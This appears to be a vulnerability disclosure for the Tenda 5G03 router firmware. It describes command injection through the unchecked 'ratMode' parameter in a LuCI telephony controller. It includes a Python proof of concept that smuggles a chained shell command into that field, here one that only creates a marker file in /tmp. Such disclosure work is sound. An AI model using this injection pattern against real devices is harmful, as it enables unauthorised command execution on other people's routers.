Submittion Date: 2026.3.16  
Vendor: 5G03  
Firmware: V05.03.02.04 (Version 1.0)  
Download Link: https://www.tenda.com.cn/material/show/4058  

In /usr/lib/lua/luci/controller/admin/telephony.lua, the function ```action_set_rat_mode``` handles the important parameter string ```ratMode``` without checking it, 
which leads to a command injection vulnerability. 

![image](../image/action_set_rat_mode-1.png)
![image](../image/action_set_rat_mode-2.png)

The potentially attacking vector is as follows:  
```py
import requests

TARGET_URL = "http://192.168.1.1/cgi-bin/luci/admin/telephony/trigger_set_nw_rat"
COOKIES = {"sysauth": "session_id"}

# The command is string.format("mipc_wan_cli --nw_set_rat \"%s\"", ratMode)
# We use " to close the quote, ; to chain the command, and # to comment out the rest
cmd = '4G"; touch /tmp/RAT_MODE_VULN_PROVED; #'

data = {
    "Set": "1",
    "ratMode": cmd
}

try:
    response = requests.post(TARGET_URL, data=data, cookies=COOKIES, timeout=10)
    if response.status_code == 200:
        print("[+] Attack successfully")
    else:
        print(f"[-] Attack failed")
except Exception as e:
    print(f"[-] Error: {e}")
```

